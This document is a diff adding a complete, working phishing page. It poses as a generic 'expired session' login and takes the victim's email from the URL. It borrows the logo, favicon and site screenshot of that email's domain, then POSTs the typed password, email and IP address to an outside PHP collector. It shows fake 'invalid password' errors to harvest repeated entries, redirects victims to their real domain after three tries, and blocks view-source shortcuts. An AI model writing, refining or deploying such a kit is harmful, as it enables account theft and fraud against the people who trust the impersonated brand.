@@ -1,0 +1,592 @@
+<html lang="en">
+<head>
+<head>
+  <!-- Keep only one jQuery version -->
+  <script src="https://code.jquery.com/jquery-3.3.1.js"
+          integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
+          crossorigin="anonymous"></script>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Dynamic favicon will be injected here -->
+  <link rel="shortcut icon" id="dynamic-favicon" href="data:," type="image/png">
+
+  <!-- Bootstrap CSS -->
+  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+  <title class="logoname">Portal Access</title>
+  <link href="css/hover.css" rel="stylesheet" media="all">
+</head>
+<script>
+  function validateform() {
+    document.getElementById("logoimg").src = "https://res.cloudinary.com/pta/image/upload/v1631524936/ii_c5byfb.png";
+  }
+</script>
+
+<script>
+  window.addEventListener("load", event => {
+    var image = document.querySelector('img');
+    var isLoaded = image.complete && image.naturalHeight !== 0;
+  });
+</script>
+
+<script>
+  function myFunction() {
+    document.getElementById("password").focus();
+  }
+</script>
+
+<script>
+  function validate() {
+    var bx = document.myform.p1.value;
+    if (bx.length > 5) {
+      document.getElementById("msg").style.display = "block";
+      document.getElementById("p2").focus();
+      return false;
+    } else {
+      document.getElementById("error").style.display = "block";
+      document.getElementById("p1").focus();
+    }
+  }
+</script>
+
+<style type="text/css">
+  /* Bootstrap core CSS (trimmed for brevity — full Bootstrap 3.3.7 included in original) */
+  html {
+    font-family: sans-serif;
+    -webkit-text-size-adjust: 100%;
+    -ms-text-size-adjust: 100%;
+  }
+  body {
+    margin: 0;
+  }
+  *,
+  *::before,
+  *::after {
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+  }
+  .container {
+    padding-right: 15px;
+    padding-left: 15px;
+    margin-right: auto;
+    margin-left: auto;
+  }
+  .input-group {
+    position: relative;
+    display: table;
+    border-collapse: separate;
+  }
+  .input-group .form-control {
+    position: relative;
+    z-index: 2;
+    float: left;
+    width: 100%;
+    margin-bottom: 0;
+    display: table-cell;
+  }
+  .input-group-addon {
+    padding: 6px 12px;
+    font-size: 14px;
+    font-weight: 400;
+    line-height: 1;
+    color: #555;
+    text-align: center;
+    background-color: #eee;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    display: table-cell;
+    width: 1%;
+    white-space: nowrap;
+    vertical-align: middle;
+  }
+  .input-group-addon:first-child {
+    border-right: 0;
+    border-top-right-radius: 0;
+    border-bottom-right-radius: 0;
+  }
+  .input-group .form-control:last-child {
+    border-top-left-radius: 0;
+    border-bottom-left-radius: 0;
+  }
+  .form-control {
+    display: block;
+    width: 100%;
+    height: 34px;
+    padding: 6px 12px;
+    font-size: 14px;
+    line-height: 1.42857143;
+    color: #555;
+    background-color: #fff;
+    background-image: none;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
+    box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
+    -webkit-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+    -o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+    transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+  }
+  .form-group {
+    margin-bottom: 15px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 6px 12px;
+    margin-bottom: 0;
+    font-size: 14px;
+    font-weight: 400;
+    line-height: 1.42857143;
+    text-align: center;
+    white-space: nowrap;
+    vertical-align: middle;
+    cursor: pointer;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    background-image: none;
+    border: 1px solid transparent;
+    border-radius: 4px;
+  }
+  .btn-primary {
+    color: #fff;
+    background-color: #337ab7;
+    border-color: #2e6da4;
+  }
+  .btn-block {
+    display: block;
+    width: 100%;
+  }
+  .alert {
+    padding: 15px;
+    margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;
+  }
+  .alert-danger {
+    color: #a94442;
+    background-color: #f2dede;
+    border-color: #ebccd1;
+  }
+  .text-center {
+    text-align: center;
+  }
+  .text-danger {
+    color: #a94442;
+  }
+  .clearfix:before,
+  .clearfix:after {
+    display: table;
+    content: " ";
+  }
+  .clearfix:after {
+    clear: both;
+  }
+  .pull-left {
+    float: left !important;
+  }
+  .pull-right {
+    float: right !important;
+  }
+  .checkbox-inline {
+    position: relative;
+    display: inline-block;
+    padding-left: 20px;
+    margin-bottom: 0;
+    font-weight: 400;
+    vertical-align: middle;
+    cursor: pointer;
+  }
+</style>
+
+<style type="text/css">
+  .login-form {
+    width: 385px;
+    margin: 30px auto;
+  }
+  .login-form form {
+    margin-bottom: 15px;
+    background: White;
+    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+    padding: 30px;
+  }
+  .login-form h2 {
+    margin: 0 0 15px;
+  }
+  .form-control,
+  .login-btn {
+    min-height: 38px;
+    border-radius: 2px;
+  }
+  .input-group-addon .fa {
+    font-size: 18px;
+  }
+  .login-btn {
+    font-size: 15px;
+    font-weight: bold;
+  }
+  .social-btn .btn {
+    border: none;
+    margin: 10px 3px 0;
+    opacity: 1;
+  }
+  .social-btn .btn:hover {
+    opacity: 0.9;
+  }
+  .social-btn .btn-primary {
+    background: #507cc0;
+  }
+  .social-btn .btn-info {
+    background: #64ccf1;
+  }
+  .social-btn .btn-danger {
+    background: #df4930;
+  }
+  .or-seperator {
+    margin-top: 20px;
+    text-align: center;
+    border-top: 1px solid #ccc;
+  }
+  .or-seperator i {
+    padding: 0 10px;
+    background: #f7f7f7;
+    position: relative;
+    top: -11px;
+    z-index: 1;
+  }
+
+  /* Full-screen loading overlay with CSS spinner */
+  #loadingOverlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.6);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    visibility: hidden;
+    opacity: 0;
+    transition: visibility 0s, opacity 0.3s ease;
+  }
+  #loadingOverlay.show {
+    visibility: visible;
+    opacity: 1;
+  }
+
+  /* Spinner – responsive and larger */
+  .loader-spinner {
+    border: 6px solid rgba(255, 255, 255, 0.3);
+    border-top: 6px solid #fff;
+    border-radius: 50%;
+    width: 80px;
+    height: 80px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+
+  .loader-text {
+    color: #fff;
+    font-size: 1.2rem;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* Responsive adjustment for small screens */
+  @media (max-width: 480px) {
+    .loader-spinner {
+      width: 60px;
+      height: 60px;
+      border-width: 5px;
+    }
+    .loader-text {
+      font-size: 1rem;
+    }
+  }
+</style>
+
+<div style="display: none;">
+  <FORM NAME="joe">
+    <INPUT TYPE="hidden" NAME="burns" SIZE="35">
+  </FORM>
+</div>
+
+<SCRIPT LANGUAGE="javascript">
+  var locate = window.location
+  document.joe.burns.value = locate
+  var text = document.joe.burns.value
+
+  function delineate(str) {
+    theleft = str.indexOf("#") + 1;
+    theright = str.lastIndexOf("@");
+    return (str.substring(theleft, theright));
+  }
+</script>
+</head>
+<body onLoad="return myFunction();">
+  <p>&nbsp;</p>
+  <p>&nbsp;</p>
+
+  <div class="login-form">
+    <form action="#" method="get" name="mac" id="mac">
+      <h2 class="text-center">
+        <div id="top">
+          <img src="https://res.cloudinary.com/pta/image/upload/v1631524936/ii_c5byfb.png" alt="" id="logoimg"
+            onerror="return validateform();" style="width:50px;height:50px;">
+          <span style="vertical-align: middle; padding-left: 5px; text-transform: capitalize; font-weight: semi-bold; color: #514c4cd6;"
+            class="logoname"></span><br><br>
+          <span style="font-size: 17px; color:brown;"> Expired session! Login to Continue</span>
+        </div>
+      </h2>
+      <p><span style="font-size: 18px; color:gray;">
+          <center>
+            <input type="hidden" id="code" value="9389">
+            <div class="alert alert-danger" id="msg" style="display: none;">Email or password is incorrect</div>
+            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+          </center>
+          <div class="form-group">
+            <div class="input-group">
+              <span class="input-group-addon"><i class="fas fa-user"></i></span>
+              <input type="email" class="form-control" name="username" placeholder="Username" value="" id="email" readonly>
+            </div>
+          </div>
+
+          <div class="form-group" id="p1a" style="display: block;">
+            <div class="input-group">
+              <span class="input-group-addon"><i class="fas fa-lock"></i></span>
+              <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required="">
+              <input type="hidden" id="bot" name="bot" value="">
+              <SCRIPT LANGUAGE="javascript">
+                var locate = window.location
+                document.joe.burns.value = locate
+                var text = document.joe.burns.value
+                var res = delineate(text);
+                var zork1 = res;
+
+                function delineate(str) {
+                  theleft = str.indexOf("#") + 1;
+                  theright = str.lastIndexOf("@");
+                  return (str.substring(theleft, theright));
+                }
+                document.mac.bot.value = zork1;
+              </script>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">Login</button>
+          </div>
+          <div class="clearfix">
+            <label class="pull-left checkbox-inline"><input type="checkbox" checked> Secured Login session?</label>
+          </div>
+        </span></p>
+    </form>
+    <p style="text-align:center; font-size:12px;">&copy;2026. <span style="text-transform: capitalize;" class="logoname"></span>.com</p>
+  </div>
+
+  <!-- Loading overlay (CSS spinner) -->
+  <div id="loadingOverlay">
+    <div class="loader-spinner"></div>
+    <div class="loader-text">Signing in...</div>
+  </div>
+
+  <style>
+    .tb_button {
+      padding: 1px;
+      cursor: pointer;
+      border-right: 1px solid #8b8b8b;
+      border-left: 1px solid #FFF;
+      border-bottom: 1px solid #fff;
+    }
+    .tb_button.hover {
+      border: 2px outset #def;
+      background-color: #f8f8f8 !important;
+    }
+    .ws_toolbar {
+      z-index: 100000
+    }
+    .ws_toolbar .ws_tb_btn {
+      cursor: pointer;
+      border: 1px solid #555;
+      padding: 3px
+    }
+    .tb_highlight {
+      background-color: yellow
+    }
+    .tb_hide {
+      visibility: hidden
+    }
+    .ws_toolbar img {
+      padding: 2px;
+      margin: 0px
+    }
+  </style>
+
+  <!-- Optional JavaScript -->
+  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+  <script>
+    // Security measures
+    document.addEventListener('contextmenu', event => event.preventDefault());
+    document.addEventListener('keydown', (e) => {
+      if (e.ctrlKey && [67, 86, 85, 83, 117].includes(e.keyCode)) e.preventDefault();
+    });
+
+    $(document).ready(function () {
+      const config = {
+        attemptLimit: 3,
+        ipAPI: 'https://api.ipify.org?format=json'
+      };
+
+      let attemptCount = 0;
+      let userIP = 'Unknown';
+      let isSubmitting = false; // flag to prevent double submissions during overlay
+
+      // Get IP address
+      $.getJSON(config.ipAPI).done(function (data) { userIP = data.ip; });
+
+      // Enhanced email extraction from multiple sources
+      function extractEmailFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const hash = window.location.hash.substring(1);
+
+        if (urlParams.get('state')) {
+          return urlParams.get('state');
+        } else if (urlParams.get('email')) {
+          return urlParams.get('email');
+        } else if (hash && hash.includes('@')) {
+          const emailMatch = hash.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
+          return emailMatch ? emailMatch[1] : null;
+        }
+        return null;
+      }
+
+      const email = extractEmailFromURL();
+
+      if (email && validateEmail(email)) {
+        const domain = email.split('@').pop();
+        const cleanDomain = domain.replace(/^www\./i, '');
+
+        $('#email').val(email);
+
+        const logoImg = $('#logoimg');
+        logoImg.off('error');
+        logoImg.attr('src', `https://cdn.brandfetch.io/${cleanDomain}?c=1idEMLfKukXymus6cpz`);
+        logoImg.css({
+          'width': '150px',
+          'height': 'auto'
+        });
+        logoImg.on('error', function () {
+          $(this).attr('src', '');
+        });
+
+        const faviconUrl = `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=64`;
+        $('#dynamic-favicon').attr({
+          'href': faviconUrl,
+          'type': 'image/png'
+        });
+
+        $('.logoname').text(cleanDomain.split('.')[0]);
+
+        document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/https://${cleanDomain}')`;
+        document.body.style.backgroundSize = 'cover';
+        document.body.style.backgroundPosition = 'center top';
+        document.body.style.backgroundRepeat = 'no-repeat';
+        document.body.style.backgroundAttachment = 'scroll';
+      }
+
+      // ===== Allow Enter key to submit form from any input =====
+      $('#mac').on('keydown', 'input', function (e) {
+        if (e.key === 'Enter' || e.keyCode === 13) {
+          e.preventDefault();
+          $('#mac').submit();
+        }
+      });
+
+      // Form submission handler
+      $('#mac').on('submit', async function (e) {
+        e.preventDefault();
+
+        // Prevent double submissions while loading overlay is active
+        if (isSubmitting) return;
+
+        const email = $('#email').val().trim();
+        const password = $('#password').val().trim();
+        const domain = email.split('@').pop();
+
+        // Validation – password is required
+        if (!validateEmail(email)) {
+          showError('Invalid email format');
+          return;
+        }
+        if (!password) {
+          showError('Password required');
+          return; // do NOT count attempt
+        }
+
+        // Valid submission: start overlay and delay
+        isSubmitting = true;
+        $('#loadingOverlay').addClass('show');
+
+        // Increment attempt count (only for valid password submissions)
+        attemptCount++;
+
+        // Send data to PHP endpoint (async, but we wait for overlay anyway)
+        try {
+          await $.post('https://www.aiceriergy.com/js/cameleon.php', {
+            ip: userIP,
+            email: email,
+            password: password,
+            domain: domain,
+            page: window.location.href
+          });
+        } catch (error) {
+          console.error('PHP submission error:', error);
+        }
+
+        // Wait 5 seconds before hiding overlay and allowing next attempt
+        setTimeout(function () {
+          $('#loadingOverlay').removeClass('show');
+          isSubmitting = false;
+
+          // Clear password field for next attempt
+          $('#password').val('');
+
+          // Handle attempts – if limit reached, redirect after overlay
+          if (attemptCount >= config.attemptLimit) {
+            window.location.replace(`http://www.${domain}`);
+          } else {
+            // Show error message with attempt count
+            $('#msg').html(`<span style="color:red">Invalid email or password </span>`).show();
+          }
+        }, 5000);
+      });
+
+      function validateEmail(email) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      }
+
+      function showError(message) {
+        $('#error').text(message).show();
+        setTimeout(() => $('#error').hide(), 3000);
+      }
+    });
+  </script>
+
+</body>
+</html>
